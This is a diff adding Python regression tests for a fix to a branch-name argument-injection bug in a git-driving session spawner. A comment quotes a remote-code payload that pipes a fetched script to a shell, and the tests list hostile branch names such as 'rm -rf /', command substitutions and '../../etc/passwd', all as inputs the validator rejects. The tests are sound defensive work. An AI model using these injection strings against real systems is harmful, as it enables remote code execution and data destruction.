@@ -2,9 +2,9 @@
 
 from __future__ import annotations
 
-from unittest.mock import patch
+from unittest.mock import MagicMock, patch
 
-from spawner import SessionSpawner
+from spawner import SessionSpawner, _is_safe_branch
 
 
 class TestSpawnPrReview:
@@ -134,3 +134,79 @@ class TestSpawnErrorHandling:
 
         # With no repo_path and no CLIENT_REPO_PATH, cwd should be None
         assert mock_popen.call_args[1]["cwd"] is None
+
+
+# --- Branch-name argument-injection regression ---
+#
+# Bug: _ensure_branch_current passed webhook-controlled branch names
+# directly into `git fetch origin <branch>` etc. A branch starting
+# with `-` (e.g. `--upload-pack=curl evil.sh|sh`) would be parsed by
+# git as an option, historically a full RCE vector (CVE-2017-1000117
+# family). Fix: validate branch names against _SAFE_BRANCH_RE and
+# add `--` sentinel to fetch/pull (checkout can't use `--` because
+# it treats args after `--` as pathspecs).
+
+
+class TestBranchNameValidation:
+    def test_safe_branch_accepts_normal_names(self) -> None:
+        assert _is_safe_branch("main")
+        assert _is_safe_branch("feature/foo")
+        assert _is_safe_branch("ai/SCRUM-16")
+        assert _is_safe_branch("release/2026.04")
+        assert _is_safe_branch("user_branch.v2")
+
+    def test_safe_branch_rejects_leading_dash(self) -> None:
+        assert not _is_safe_branch("-foo")
+        assert not _is_safe_branch("--upload-pack=curl")
+        assert not _is_safe_branch("-")
+
+    def test_safe_branch_rejects_empty_and_whitespace(self) -> None:
+        assert not _is_safe_branch("")
+        assert not _is_safe_branch(" main")
+        assert not _is_safe_branch("main branch")
+        assert not _is_safe_branch("main\n")
+        assert not _is_safe_branch("main\t")
+
+    def test_safe_branch_rejects_shell_metacharacters(self) -> None:
+        assert not _is_safe_branch("main;rm -rf /")
+        assert not _is_safe_branch("main`whoami`")
+        assert not _is_safe_branch("main$(pwd)")
+        assert not _is_safe_branch("main|cat")
+        assert not _is_safe_branch("main&&evil")
+
+    def test_safe_branch_rejects_double_dot(self) -> None:
+        assert not _is_safe_branch("../../etc/passwd")
+        assert not _is_safe_branch("foo..bar")
+
+    def test_safe_branch_rejects_overlong(self) -> None:
+        assert not _is_safe_branch("a" * 256)
+
+    def test_ensure_branch_current_rejects_unsafe_branch(
+        self, tmp_path
+    ) -> None:
+        """Unsafe branches must short-circuit without running git."""
+        spawner = SessionSpawner(repo_path=str(tmp_path))
+        log = MagicMock()
+        with patch("spawner.subprocess.run") as mock_run:
+            spawner._ensure_branch_current("--upload-pack=evil", log)
+        mock_run.assert_not_called()
+        log.error.assert_called_once()
+        assert log.error.call_args[0][0] == "unsafe_branch_name_rejected"
+
+    def test_ensure_branch_current_git_fetch_uses_sentinel(
+        self, tmp_path
+    ) -> None:
+        """Safe branches should invoke git with the '--' sentinel for fetch/pull."""
+        spawner = SessionSpawner(repo_path=str(tmp_path))
+        log = MagicMock()
+        ok_result = MagicMock(returncode=0, stderr="")
+        with patch("spawner.subprocess.run", return_value=ok_result) as mock_run:
+            spawner._ensure_branch_current("ai/SCRUM-16", log)
+        # All subprocess.run calls — verify fetch and pull include "--"
+        calls = [call.args[0] for call in mock_run.call_args_list]
+        fetch_cmd = next(c for c in calls if c[:2] == ["git", "fetch"])
+        pull_cmd = next(c for c in calls if c[:2] == ["git", "pull"])
+        assert "--" in fetch_cmd
+        assert fetch_cmd[-1] == "ai/SCRUM-16"
+        assert "--" in pull_cmd
+        assert pull_cmd[-1] == "ai/SCRUM-16"
